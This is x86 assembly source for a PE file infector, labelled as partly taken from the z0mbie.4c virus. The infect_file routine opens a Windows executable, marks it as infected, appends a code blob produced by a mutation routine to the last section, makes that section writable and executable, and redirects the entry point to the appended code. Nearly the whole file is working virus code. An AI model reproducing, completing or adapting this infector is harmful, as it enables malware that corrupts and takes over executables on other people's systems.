
 ; LAST SECTION APPENDING (partially from z0mbie.4c-virus)

 ; input: EDX=file name

include                 mz.inc
include                 pe.inc

infect_file             proc    pascal
                        local   mz:BYTE:size mz_struc
                        local   oe:BYTE:size oe_struc
                        local   pe:BYTE:size pe_struc
                        local   oe_offs
                        pusha

                        lea     esi, pe
                        lea     edi, oe

                        call    fopen
                        jc      __exit
                        xchg    ebx, eax

                        lea     edx, mz
                        mov     ecx, size mz_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     [edx].mz_id, 'ZM'
                        jne     __close

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     [esi].pe_id, 'EP'
                        jne     __close

                        test    [esi].pe_exeflags, 2000h ; dll?
                        jne     __close

                        cmp     [esi].pe_linkminor, 15
                        je      __close
                        mov     [esi].pe_linkminor, 15

                        or      [esi].pe_exeflags, 0001h ; relocs. stripped

                        movzx   ecx, [esi].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc
                        mov     edx, mz.mz_neptr
                        add     edx, pe_ntheader_id-pe_id ; 18h
                        movzx   eax, [esi].pe_ntheadersize
                        add     edx, eax
                        add     edx, ecx
                        mov     oe_offs, edx
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fread

                        xor     eax, eax
                        cmp     [edi].oe_virt_size, eax
                        je      __close
                        cmp     [edi].oe_phys_size, eax
                        je      __close

                        mov     eax, [edi].oe_phys_size
                        mov     ecx, [esi].pe_filealign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     [edi].oe_phys_size, eax

                        mov     eax, [edi].oe_virt_size
                        mov     ecx, [esi].pe_objectalign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     [edi].oe_virt_size, eax

                        mov     edx, [edi].oe_phys_offs
                        add     edx, [edi].oe_phys_size
                        call    fseek

                        mov     eax, [esi].pe_entrypointrva
                        add     eax, [esi].pe_imagebase
                        mov     old_eip, eax

                        mov     eax, [esi].pe_imagebase
                        add     eax, [edi].oe_virt_rva
                        add     eax, [edi].oe_phys_size

                        push    offset testcode
                        push    testcode_size
                        push    offset obuf
                        push    offset obufsize
                        push    eax           ; virus VA
                        call    expo

                        cmp     eax, EXPO_ERR_SUCCESS
                        jne     __close

 ;                      call    gen_copy
 ;                      jc      __close

                        mov     eax, [edi].oe_phys_size
                        add     eax, [edi].oe_virt_rva
 ;                      add     eax, obuf_entry
                        mov     [esi].pe_entrypointrva, eax
                        mov     eax, obufsize
 ;                      add     eax, 4095
 ;                      and     eax, not 4095
                        add     [edi].oe_phys_size, eax
                        add     [edi].oe_virt_size, eax
                        add     [esi].pe_sizeofcode, eax
                        add     [esi].pe_imagesize, eax

                        add     [esi].pe_stackreservesize, 1048576 ; stk+1MB

                        or      [edi].oe_flags, 0C0000000h  ; flags: r-w-ex

                        mov     ecx, obufsize
                        lea     edx, obuf
                        call    fwrite

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fwrite

                        mov     edx, oe_offs
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fwrite

__close:                call    fclose

__exit:                 popa
                        ret
                        endp
